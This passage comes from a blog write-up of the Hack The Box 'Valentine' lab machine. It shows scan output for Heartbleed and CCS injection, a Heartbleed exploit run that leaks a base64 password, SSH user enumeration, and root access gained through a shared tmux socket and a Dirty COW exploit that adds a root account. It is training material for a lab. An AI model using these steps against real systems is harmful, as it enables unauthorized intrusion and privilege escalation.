</span></span><span class=line><span class=cl>  <span class=mi>25</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>https:</span><span class=sr>//</span><span class=n>www</span><span class=o>.</span><span class=n>securityfocus</span><span class=o>.</span><span class=n>com</span><span class=sr>/bid/</span><span class=mi>70574</span>
</span></span><span class=line><span class=cl>  <span class=mi>26</span>   <span class=err>│</span> <span class=o>|</span><span class=n>_</span>      <span class=n>https:</span><span class=sr>//</span><span class=n>www</span><span class=o>.</span><span class=n>openssl</span><span class=o>.</span><span class=n>org</span><span class=sr>/~bodo/ss</span><span class=n>l</span><span class=o>-</span><span class=n>poodle</span><span class=o>.</span><span class=n>pdf</span>
</span></span><span class=line><span class=cl>  <span class=mi>27</span>   <span class=err>│</span> <span class=o>|</span><span class=n>_http</span><span class=o>-</span><span class=n>vuln</span><span class=o>-</span><span class=n>cve2017</span><span class=o>-</span><span class=mi>1001000</span><span class=p>:</span> <span class=n>ERROR:</span> <span class=n>Script</span> <span class=n>execution</span> <span class=n>failed</span> <span class=p>(</span><span class=k>use</span> <span class=o>-</span><span class=n>d</span> <span class=n>to</span> <span class=n>debug</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>28</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>ssl</span><span class=o>-</span><span class=n>ccs</span><span class=o>-</span><span class=n>injection:</span>
</span></span><span class=line><span class=cl>  <span class=mi>29</span>   <span class=err>│</span> <span class=o>|</span>   <span class=n>VULNERABLE:</span>
</span></span><span class=line><span class=cl>  <span class=mi>30</span>   <span class=err>│</span> <span class=o>|</span>   <span class=n>SSL</span><span class=o>/</span><span class=n>TLS</span> <span class=n>MITM</span> <span class=n>vulnerability</span> <span class=p>(</span><span class=n>CCS</span> <span class=n>Injection</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>31</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>State:</span> <span class=n>VULNERABLE</span>
</span></span><span class=line><span class=cl>  <span class=mi>32</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>Risk</span> <span class=n>factor:</span> <span class=n>High</span>
</span></span><span class=line><span class=cl>  <span class=mi>33</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>OpenSSL</span> <span class=n>before</span> <span class=mf>0.9.8</span><span class=n>za</span><span class=p>,</span> <span class=mf>1.0.0</span> <span class=n>before</span> <span class=mf>1.0.0</span><span class=n>m</span><span class=p>,</span> <span class=ow>and</span> <span class=mf>1.0.1</span> <span class=n>before</span> <span class=mf>1.0.1</span><span class=n>h</span>
</span></span><span class=line><span class=cl>  <span class=mi>34</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>does</span> <span class=ow>not</span> <span class=n>properly</span> <span class=n>restrict</span> <span class=n>processing</span> <span class=n>of</span> <span class=n>ChangeCipherSpec</span> <span class=n>messages</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=mi>35</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>which</span> <span class=n>allows</span> <span class=n>man</span><span class=o>-</span><span class=n>in</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>middle</span> <span class=n>attackers</span> <span class=n>to</span> <span class=n>trigger</span> <span class=k>use</span> <span class=nn>of</span> <span class=n>a</span> <span class=n>zero</span>
</span></span><span class=line><span class=cl>  <span class=mi>36</span>   <span class=err>│</span> <span class=o>|</span>       <span class=nb>length</span> <span class=n>master</span> <span class=n>key</span> <span class=n>in</span> <span class=n>certain</span> <span class=n>OpenSSL</span><span class=o>-</span><span class=n>to</span><span class=o>-</span><span class=n>OpenSSL</span> <span class=n>communications</span><span class=p>,</span> <span class=ow>and</span>
</span></span><span class=line><span class=cl>  <span class=mi>37</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>consequently</span> <span class=n>hijack</span> <span class=n>sessions</span> <span class=ow>or</span> <span class=n>obtain</span> <span class=n>sensitive</span> <span class=n>information</span><span class=p>,</span> <span class=n>via</span>
</span></span><span class=line><span class=cl>  <span class=mi>38</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>a</span> <span class=n>crafted</span> <span class=n>TLS</span> <span class=n>handshake</span><span class=p>,</span> <span class=n>aka</span> <span class=n>the</span> <span class=s>&#34;CCS Injection&#34;</span> <span class=n>vulnerability</span><span class=o>.</span>
</span></span><span class=line><span class=cl>  <span class=mi>39</span>   <span class=err>│</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>  <span class=mi>40</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>References:</span>
</span></span><span class=line><span class=cl>  <span class=mi>41</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>http:</span><span class=sr>//</span><span class=n>www</span><span class=o>.</span><span class=n>openssl</span><span class=o>.</span><span class=n>org</span><span class=sr>/news/s</span><span class=n>ecadv_20140605</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl>  <span class=mi>42</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>https:</span><span class=sr>//c</span><span class=n>ve</span><span class=o>.</span><span class=n>mitre</span><span class=o>.</span><span class=n>org</span><span class=sr>/cgi-bin/c</span><span class=n>vename</span><span class=o>.</span><span class=n>cgi</span><span class=p>?</span><span class=n>name</span><span class=o>=</span><span class=n>CVE</span><span class=o>-</span><span class=mi>2014</span><span class=o>-</span><span class=mo>0224</span>
</span></span><span class=line><span class=cl>  <span class=mi>43</span>   <span class=err>│</span> <span class=o>|</span><span class=n>_</span>      <span class=n>http:</span><span class=sr>//</span><span class=n>www</span><span class=o>.</span><span class=n>cvedetails</span><span class=o>.</span><span class=n>com</span><span class=sr>/cve/</span><span class=mi>2014</span><span class=o>-</span><span class=mo>0224</span>
</span></span><span class=line><span class=cl>  <span class=mi>44</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>ssl</span><span class=o>-</span><span class=n>heartbleed:</span>
</span></span><span class=line><span class=cl>  <span class=mi>45</span>   <span class=err>│</span> <span class=o>|</span>   <span class=n>VULNERABLE:</span>
</span></span><span class=line><span class=cl>  <span class=mi>46</span>   <span class=err>│</span> <span class=o>|</span>   <span class=n>The</span> <span class=n>Heartbleed</span> <span class=n>Bug</span> <span class=n>is</span> <span class=n>a</span> <span class=n>serious</span> <span class=n>vulnerability</span> <span class=n>in</span> <span class=n>the</span> <span class=n>popular</span> <span class=n>OpenSSL</span> <span class=n>cryptographic</span> <span class=n>software</span> <span class=n>library</span><span class=o>.</span> <span class=n>It</span> <span class=n>allows</span> <span class=k>for</span> <span class=n>stealing</span> <span class=n>information</span> <span class=n>intended</span> <span class=n>to</span> <span class=n>be</span> <span class=n>protected</span> <span class=n>by</span> <span class=n>SSL</span><span class=o>/</span><span class=n>TLS</span> <span class=n>encryption</span><span class=o>.</span>
</span></span><span class=line><span class=cl>  <span class=mi>47</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>State:</span> <span class=n>VULNERABLE</span>
</span></span><span class=line><span class=cl>  <span class=mi>48</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>Risk</span> <span class=n>factor:</span> <span class=n>High</span>
</span></span><span class=line><span class=cl>  <span class=mi>49</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>OpenSSL</span> <span class=n>versions</span> <span class=mf>1.0.1</span> <span class=ow>and</span> <span class=mf>1.0.2</span><span class=o>-</span><span class=n>beta</span> <span class=n>releases</span> <span class=p>(</span><span class=n>including</span> <span class=mf>1.0.1</span><span class=n>f</span> <span class=ow>and</span> <span class=mf>1.0.2</span><span class=o>-</span><span class=n>beta1</span><span class=p>)</span> <span class=n>of</span> <span class=n>OpenSSL</span> <span class=n>are</span> <span class=n>affected</span> <span class=n>by</span> <span class=n>the</span> <span class=n>Heartbleed</span> <span class=n>bug</span><span class=o>.</span> <span class=n>The</span> <span class=n>bug</span> <span class=n>allows</span> <span class=k>for</span> <span class=n>reading</span> <span class=n>memory</span> <span class=n>of</span> <span class=n>systems</span> <span class=n>protected</span> <span class=n>by</span> <span class=n>the</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>vulnerable</span> <span class=n>OpenSSL</span> <span class=n>versions</span> <span class=ow>and</span> <span class=n>could</span> <span class=n>allow</span> <span class=k>for</span> <span class=n>disclosure</span> <span class=n>of</span> <span class=n>otherwise</span> <span class=n>encrypted</span> <span class=n>confidential</span> <span class=n>information</span> <span class=n>as</span> <span class=n>well</span> <span class=n>as</span> <span class=n>the</span> <span class=n>encryption</span> <span class=nb>keys</span> <span class=n>themselves</span><span class=o>.</span>
</span></span><span class=line><span class=cl>  <span class=mi>50</span>   <span class=err>│</span> <span class=o>|</span>
</span></span><span class=line><span class=cl>  <span class=mi>51</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>References:</span>
</span></span><span class=line><span class=cl>  <span class=mi>52</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>http:</span><span class=sr>//</span><span class=n>www</span><span class=o>.</span><span class=n>openssl</span><span class=o>.</span><span class=n>org</span><span class=sr>/news/s</span><span class=n>ecadv_20140407</span><span class=o>.</span><span class=n>txt</span>
</span></span><span class=line><span class=cl>  <span class=mi>53</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>https:</span><span class=sr>//c</span><span class=n>ve</span><span class=o>.</span><span class=n>mitre</span><span class=o>.</span><span class=n>org</span><span class=sr>/cgi-bin/c</span><span class=n>vename</span><span class=o>.</span><span class=n>cgi</span><span class=p>?</span><span class=n>name</span><span class=o>=</span><span class=n>CVE</span><span class=o>-</span><span class=mi>2014</span><span class=o>-</span><span class=mo>0160</span>
</span></span><span class=line><span class=cl>  <span class=mi>54</span>   <span class=err>│</span> <span class=o>|</span><span class=n>_</span>      <span class=n>http:</span><span class=sr>//c</span><span class=n>vedetails</span><span class=o>.</span><span class=n>com</span><span class=sr>/cve/</span><span class=mi>2014</span><span class=o>-</span><span class=mo>0160</span><span class=o>/</span>
</span></span><span class=line><span class=cl>  <span class=mi>55</span>   <span class=err>│</span>
</span></span></code></pre></div><p>We can observe that there are some vulnerabilities associated with the <strong>ssl</strong> website.</p><p>One especially called my attention, checking the scan we can see that is vulnerable to <strong>heartbleed</strong>. This make sense because if we take a look at the homepage’s picture the heart bleeding gives us an clue of that vulnerability.</p><p><strong>Heartbleed</strong> vuln is a security bug in some outdated versions of the <strong>OpenSSL</strong> cryptography library, which is a widely used implementation of the <strong>Transport Layer Security protocol</strong>. The vulnerability was classified as a buffer over-read, a situation where more data can be read than should be allowed.</p><p><img alt=Untitled loading=lazy src=/HTB/valentine-5.png></p><p>Googling we can find a <strong>github</strong> <a href=https://github.com/mpgn/heartbleed-PoC>exploit</a> which fits well.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python2 heartbleed-exploit.py 10.10.10.79
</span></span></code></pre></div><p>Executing the exploit, the exploit start by sending the handshake and after that send a crafted <strong>heartbleed</strong> request and the server answer with the data leak is outputted in a file called out.txt</p><p>Once executed we retrieve the following data</p><pre tabindex=0><code>  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....&#34;.
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 3F  mV0aGVoeXBlCg==?
  0160: 23 66 17 BF 98 D1 4E C4 D9 A3 DE 86 47 94 A6 26  #f....N.....G..&amp;
  0170: 38 38 88 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  88..............
  0180: 00 7E 00 00 00 00 00 00 00 00 00 00 00 00 00 00  .~..............
  0200: 31 33 30 38 41 46 42 35 35 32 41 42 39 34 34 37  1308AFB552AB9447
  0210: 43 31 31 46 39 32 42 31 34 30 42 45 44 38 41 46  C11F92B140BED8AF
  0220: 43 32 38 36 38 37 41 36 36 32 37 45 45 32 30 35  C28687A6627EE205
  0230: 42 42 30 37 32 38 36 43 42 31 41 31 46 38 35 46  BB07286CB1A1F85F
  0240: 30 41 38 45 42 39 39 39 35 46 44 35 44 33 32 30  0A8EB9995FD5D320
  0250: 44 39 35 44 45 44 37 30 32 32 43 44 34 36 34 22  D95DED7022CD464&#34;
  0260: 3E 6D 61 63 2D 69 6E 74 65 6C 3C 2F 64 65 76 69  &gt;mac-intel&lt;/devi
  0270: 63 65 2D 69 64 3E 0A 3C 6D 61 63 2D 61 64 64 72  ce-id&gt;.&lt;mac-addr
  0280: 65 73 73 2D 6C 69 73 74 3E 0A 3C 6D 61 63 2D 61  ess-list&gt;.&lt;mac-a
  0290: 64 64 72 65 73 73 3E 31 33 3A 39 30 3A 65 38 3A  ddress&gt;13:90:e8:
  02a0: 61 34 3A 63 35 3A 32 30 3C 2F 6D 61 63 2D 61 64  a4:c5:20&lt;/mac-ad
  02b0: 64 72 65 73 73 3E 3C 2F 6D 61 63 2D 61 64 64 72  dress&gt;&lt;/mac-addr
  02c0: 65 73 73 2D 6C 69 73 74 3E 0A 3C 67 72 6F 75 70  ess-list&gt;.&lt;group
  02d0: 2D 73 65 6C 65 63 74 3E 56 50 4E 3C 2F 67 72 6F  -select&gt;VPN&lt;/gro
  02e0: 75 70 2D 73 65 6C 65 63 74 3E 0A 3C 67 72 6F 75  up-select&gt;.&lt;grou
  02f0: 70 2D 61 63 63 65 73 73 3E 68 74 74 70 73 3A 2F  p-access&gt;https:/
  0300: 2F 31 30 2E 31 30 2E 31 30 2E 37 39 3A 34 34 33  /10.10.10.79:443
  0310: 3C 2F 67 72 6F 75 70 2D 61 63 63 65 73 73 3E 0A  &lt;/group-access&gt;.
  0320: 3C 2F 63 6F 6E 66 69 67 2D 61 75 74 68 3E 74 58  &lt;/config-auth&gt;tX
  0330: F0 64 BF F5 03 D7 23 28 D7 34 DB 44 83 AE 38 82  .d....#(.4.D..8.
  0340: 03 5A 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D 0D  .Z..............
  1f60: 71 A4 07 00 00 00 00 00 00 00 00 00 00 00 00 00  q...............
</code></pre><p>If we observe the output we can see a text variable with <strong>base64</strong> encoded text</p><pre tabindex=0><code>$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
</code></pre><p>Decoding the output we have the following text</p><pre tabindex=0><code>heartbleedbelievethehype
</code></pre><p>We have something but we don’t know what we can do with this phrase.</p><p>The first thing that came to my mind was maybe is a password for the <strong>id_rsa</strong> but we don’t have any users by the way.</p><p>As the ssh version is so older maybe there is some exploit which help us to enumerate ssh usernames.</p><p><img alt=Untitled loading=lazy src=/HTB/valentine-7.png></p><p>There is a bunch of them that fits so well. The one that I have selected waits for an username argument and tell us if it’s a valid username or not.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sshenum.py <span class=o>[</span>-h<span class=o>]</span> <span class=o>[</span>-p PORT<span class=o>]</span> target username
</span></span></code></pre></div><p>I have tried the default ones and some ones like <strong>heatbleed</strong> or <strong>hype</strong> since they compose the previously decoded text.</p><p><img alt=Untitled loading=lazy src=/HTB/valentine-8.png></p><p><img alt=Untitled loading=lazy src=/HTB/valentine-9.png></p><p><strong>root</strong> and <strong>hype</strong> are the only valid ones.</p><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p>I tried to access to each one using the decoded text as password and it works for <strong>hype</strong>.</p><p><img alt=Untitled loading=lazy src=/HTB/valentine-10.png></p><p>As we are logged as <strong>hype</strong>, let’s cat the <strong>user’s flag</strong></p><p><img alt=Untitled loading=lazy src=/HTB/valentine-11.png></p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><h3 id=first-way>First Way<a hidden class=anchor aria-hidden=true href=#first-way>#</a></h3><p>In order to <strong>privEsc</strong> I first go to see if there is some <strong>SUID</strong> files but nothing is useful, then I used <strong>moniProc.sh</strong> which is a bash script which I used in a lot of writeups, but only gets one cronjob which is executing a bash script on the roots directory so we can do nothing at this point.</p><p>As we don’t have the hype’s password we can’t exploit <strong>sudoers</strong> vulns.</p><p>Checking at the hype’s home directory we can see that the <strong>.bash_history</strong> file is not empty.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>exit</span>
</span></span><span class=line><span class=cl>exot
</span></span><span class=line><span class=cl><span class=nb>exit</span>
</span></span><span class=line><span class=cl>ls -la
</span></span><span class=line><span class=cl><span class=nb>cd</span> /
</span></span><span class=line><span class=cl>ls -la
</span></span><span class=line><span class=cl><span class=nb>cd</span> .devs
</span></span><span class=line><span class=cl>ls -la
</span></span><span class=line><span class=cl>tmux -L dev_sess
</span></span><span class=line><span class=cl>tmux a -t dev_sess
</span></span><span class=line><span class=cl>tmux --help
</span></span><span class=line><span class=cl>tmux -S /.devs/dev_sess
</span></span><span class=line><span class=cl><span class=nb>exit</span>
</span></span></code></pre></div><p>The history shows the use of <strong>tmux</strong> opening a session file and if we check the file’s permissions the file seems to be a <strong>SUID</strong> file and the owner is the <strong>root</strong> user but the group owner is <strong>hype</strong> so we can execute it.</p><p><img alt=Untitled loading=lazy src=/HTB/valentine-12.png></p><p>So let’s try to open the session file with <strong>tmux</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tmux -S /.devs/dev_sess
</span></span></code></pre></div><p><img alt=Untitled loading=lazy src=/HTB/valentine-13.png></p><p>We have pwnd the system.</p><p>Let’s cat the <strong>root’s flag</strong>.</p><p><img alt=Untitled loading=lazy src=/HTB/valentine-14.png></p><h3 id=second-way>Second Way<a hidden class=anchor aria-hidden=true href=#second-way>#</a></h3><p>There is other unintentional way to <strong>privEsc</strong></p><p><img alt=Untitled loading=lazy src=/HTB/valentine-15.png></p><p>If we check the <strong>kernel version</strong> we can see that is so outdated.</p><p><img alt=Untitled loading=lazy src=/HTB/valentine-16.png></p><p>In this situations dirtycow is the fastest solution to help to <strong>privEsc</strong>. This vuln take advantage of race condition to write on the <code>/etc/passwd.</code></p><p>The exploit which I am going to use creates a username called <strong>firefart</strong> with the password of your choice with <strong>root</strong> id.</p><p>First if we take a look on the code we can find how to compile the file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gcc -pthread dirtyc0w.c -o dirtyc0w -lcrypt
</span></span></code></pre></div><p>Once compiled, I send the exploit via wget and a python server in order to execute it in the remote machine.</p><p>Now let’s execute it, in this case I set <strong>firefart password</strong> as <code>password</code><strong>.</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>su firefart
</span></span></code></pre></div><p>Once logged as firefart we are able to see the <strong>flag</strong> at the <strong>root’s</strong> directory.</p><p><strong>Thank you for reading, and happy hacking! 😄</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/privesc/>Privesc</a></li><li><a href=https://pwndside.github.io/tags/web/>Web</a></li><li><a href=https://pwndside.github.io/tags/linux/>Linux</a></li><li><a href=https://pwndside.github.io/tags/ssh/>Ssh</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://pwndside.github.io/>PwndSide</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>